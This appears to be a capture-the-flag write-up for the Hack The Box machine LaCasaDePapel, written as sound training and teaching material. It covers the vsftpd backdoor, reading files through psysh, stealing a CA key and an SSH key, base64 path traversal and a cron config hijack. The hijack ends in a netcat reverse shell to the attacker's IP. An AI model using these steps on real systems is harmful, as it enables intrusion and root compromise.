---
layout: single
title: LaCasaDePapel - Hack The Box
excerpt: "I had trouble with the OTP token on this box: I never figured out why but whenever I scanned the QR code with my Google Authenticator app it would always generate an invalid token. Using a Firefox add-on I was able to properly generate the token to get access to the page. As a nice twist, the login shell was changed to psysh so I couldn't use the vsftpd exploit to get a full shell on the box. LaCasaDePapel has some typical HTB elements: scavenger hunt for SSH keys, base64 encoding and a cronjob running as root for final priv esc."
date: 2019-07-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-lacasa/lacasa_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - otp
  - vsftpd
  - cronjob
  - openssl
  - certificates
  - ssh
  - ssh rsa auth
  - php
  - psysh
  - nodejs
---

![](/assets/images/htb-writeup-lacasa/lacasa_logo.png)

I had trouble with the OTP token on this box: I never figured out why but whenever I scanned the QR code with my Google Authenticator app it would always generate an invalid token. Using a Firefox add-on I was able to properly generate the token to get access to the page. As a nice twist, the login shell was changed to psysh so I couldn't use the vsftpd exploit to get a full shell on the box. LaCasaDePapel has some typical HTB elements: scavenger hunt for SSH keys, base64 encoding and a cronjob running as root for final priv esc.

## Summary

- The main page requires an OTP token to log in, which we can generate using a Google Authenticator compatible app
- vsftpd contains a backdoor which allows us to get partial RCE through the psysh shell and read files
- We can scan the filesystem and find the CA key and an email with a link that let us login to the main webpage and download the CA certificate
- We can import both CA crt and CA key in Firefox and then log in to the HTTPS page
- The page contains the `?path` and `/file/` functions to list and read files (file's full path is base64 encoded)
- After reading `user.txt` , we can fetch the SSH private key for user `professor` and log in via SSH
- The professor's home directory is SGID and we can replace the `memcached.ini` which controls the parameters of a cronjob running as root
- We replace the `memcached.ini` file with our own file that spawns a reverse shell with netcat, gaining root access

### Nmap

```
# nmap -sC -sV -F 10.10.10.131
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-31 01:32 EDT
Nmap scan report for lacasadepapel.htb (10.10.10.131)
Host is up (0.010s latency).
Not shown: 96 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
Service Info: OS: Unix
```

### FTP enumeration

FTP anonymous access is not allowed on the FTP server

```
# ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

### HTTP enumeration Port 80

The web page on port 80 contains a login form asking for an OTP token. There's a link to the Google Authenticator application.

![](/assets/images/htb-writeup-lacasa/http_01.png)

For some reason I had problems with the Google Auth app on my phone and the token I got was always invalid. So instead I used the [Firefox Authenticator Add-On](https://addons.mozilla.org/en-US/firefox/addon/auth-helper/) instead. I'll just enter the token manually in the add-on then generate a token. The token is captured from the link in the QR code image.

![](/assets/images/htb-writeup-lacasa/http_03.png)

![](/assets/images/htb-writeup-lacasa/http_04.png)

![](/assets/images/htb-writeup-lacasa/http_02.png)

I can re-use the same token for multiple requests as long as I send the same secret.

For example: `secret=MFFHCQSUOZ3XMTLMJFBS6TS2FJGEO4BQ&token=072534&email=test%40test.com` will work everytime.

### HTTP enumeration Port 443

The page on port 443 requires a client certificate which I don't have yet.

![](/assets/images/htb-writeup-lacasa/https_01.png)

### vsftpd exploit

The vsftpd version running on this box is vulnerable and there is already a Metasploit module for it:

![](/assets/images/htb-writeup-lacasa/vsftpd.png)

I ran the Metasploit module but didn't get a session back.

![](/assets/images/htb-writeup-lacasa/metasploit.png)

I ran the exploit again and got a message that the port was already open. So the exploit worked and opened port 6200 but Metasploit didn't detect a shell listening.

![](/assets/images/htb-writeup-lacasa/metasploit2.png)

Ok, here's why, bash is not listening on port 6200 but rather psysh, some kind of PHP shell cli.

```
# nc -nv 10.10.10.131 6200
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.131:6200.
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

![](/assets/images/htb-writeup-lacasa/psysh.png)

I can't run `system` or any other commands that'll give me a shell, as those are specifically blacklisted in the `disable_functions` parameter of the `php.ini` configuration file but I can use the `scandir` and `readfile` functions to poke at the filesystem.

```
scandir('/home');
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
scandir('/home/berlin');
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
scandir('/home/dali');
=> [
     ".",
     "..",
     ".ash_history",
     ".config",
     ".qmail-default",
     ".ssh",
     "server.js",
   ]
scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
dir('/home/oslo');
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]
scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
```

In Oslo's mail directory I find an email that seemed to have been generated when I logged in with the OTP token on the main webpage.

```
scandir('/home/oslo/Maildir');
=> [
     ".",
     "..",
     ".Sent",
     ".Spam",
     "cur",
     "new",
     "tmp",
   ]
scandir('/home/oslo/Maildir/.Sent/cur');
=> [
     ".",
     "..",
     "1553996613811.M45533P25345V0000000000064766I000000000bddc36.lacasadepapel.htb,S=430,2,S",
   ]
readfile('/home/oslo/Maildir/.Sent/cur/1553996613811.M45533P25345V0000000000064766I000000000bddc36.lacasadepapel.htb,S=430,2,S');
Content-Type: text/plain; format=flowed
From: dali@lacasadepapel.htb
Content-Transfer-Encoding: 7bit
Date: Sun, 31 Mar 2019 01:53:01 +0000
Message-Id: <1553997181916-f1bee4c5-810b2c36-4f055080@lacasadepapel.htb>
MIME-Version: 1.0

Welcome to our community!
Thanks for signing up. To continue, please verify your email address by 
clicking the url below.
https://lacasadepapel.htb/64fd1030-5356-11e9-ae89-233fa7c29f94

=> 430
```

I also find the CA private key in Nairobi's home directory:

```
readfile('/home/nairobi/ca.key');
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
=> 1704
```

Following the link from the email, I get to the following page:

![](/assets/images/htb-writeup-lacasa/https_02.png)

There's a link to an online CSR generator and also a link to the CA certificate file:

```
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
```

I can convert both cert and key into a PKCS12 certificate and import it in Firefox.

```
# openssl pkcs12 -export -out certificate.pfx -inkey ca.key -in ca.crt -certfile ca.crt
Enter Export Password:
Verifying - Enter Export Password:
```

![](/assets/images/htb-writeup-lacasa/certmanager.png)

![](/assets/images/htb-writeup-lacasa/cert.png)

I now have access to the HTTPS web page, where I can browse and download files.

![](/assets/images/htb-writeup-lacasa/privatearea.png)

`<a href="?path=SEASON-1">SEASON-1</a></li><li><a href="?path=SEASON-2">SEASON-2</a>`

![](/assets/images/htb-writeup-lacasa/file.png)

![](/assets/images/htb-writeup-lacasa/cyberchef.png)

Ok, so the full path of the file read is encoded as base64. Let's try reading `/etc/passwd`:

![](/assets/images/htb-writeup-lacasa/cyberchef2.png)

![](/assets/images/htb-writeup-lacasa/etcpasswd.png)

My attempt failed but I saw that the path was inside `/home/berlin/downloads`. To read `/etc/passwd` I just used a relative path by adding a couple of  `../`  before the path.

![](/assets/images/htb-writeup-lacasa/failed.png)

![](/assets/images/htb-writeup-lacasa/etcpasswd2.png)

Ok, nice I can now read `/etc/passwd`. Let's try reading the `user.txt` flag in berlin's home directory

![](/assets/images/htb-writeup-lacasa/user.png)

Nice, I have user's flag: `4dcbd172fc9c9ef2ff65c13448d9062d`

### Getting a shell and priv esc

Next I found some SSH private key in `/home/berlin/.ssh/`:

![](/assets/images/htb-writeup-lacasa/ssh_keys_path.png)

![](/assets/images/htb-writeup-lacasa/id_rsa2.png)

After getting the key I tried using it with the obvious suspect, user `berlin` but it didn't work. However I was able to log in to user `professor`:

![](/assets/images/htb-writeup-lacasa/ssh.png)

Professor's home directory has interesting permissions, it has the SGID bit set.

![](/assets/images/htb-writeup-lacasa/perms.png)

I noticed that the process ID increments for `/home/professor/memcached.js` so I assume there is a cronjob running that process every few minutes.

```
lacasadepapel [~]$ ps -ef | grep node
 3265 dali      0:00 /usr/bin/node /home/dali/server.js
 3266 nobody    2:21 /usr/bin/node /home/oslo/server.js
 3267 berlin    0:00 /usr/bin/node /home/berlin/server.js
 3268 nobody    0:16 /usr/bin/node /home/nairobi/server.js
14133 nobody    0:21 /usr/bin/node /home/professor/memcached.js
14150 professo  0:00 grep node
[...]
lacasadepapel [~]$ ps -ef | grep node
 3265 dali      0:00 /usr/bin/node /home/dali/server.js
 3266 nobody    2:23 /usr/bin/node /home/oslo/server.js
 3267 berlin    0:00 /usr/bin/node /home/berlin/server.js
 3268 nobody    0:16 /usr/bin/node /home/nairobi/server.js
14203 nobody    0:16 /usr/bin/node /home/professor/memcached.js
14213 professo  0:00 grep node
```

`memcached.ini` contains the configuration of the process running.

```
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

I can't change this file:

```
lacasadepapel [~]$ echo invalid > memcached.ini
-ash: can't create memcached.ini: Permission denied
```

But I can delete it because of the SGID permission:

```
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ ls
memcached.js  node_modules
```

Ok, so now I can just create a new file that'll spawn a reverse shell as root:

```
[program:memcached]
command = sudo /usr/bin/nc 10.10.14.23 4444 -e /bin/sh
```

Then wait a few minutes... Root shell!

```
# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.131.
Ncat: Connection from 10.10.10.131:43525.
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
cd /root
ls
root.txt
cat root.txt
586979....
```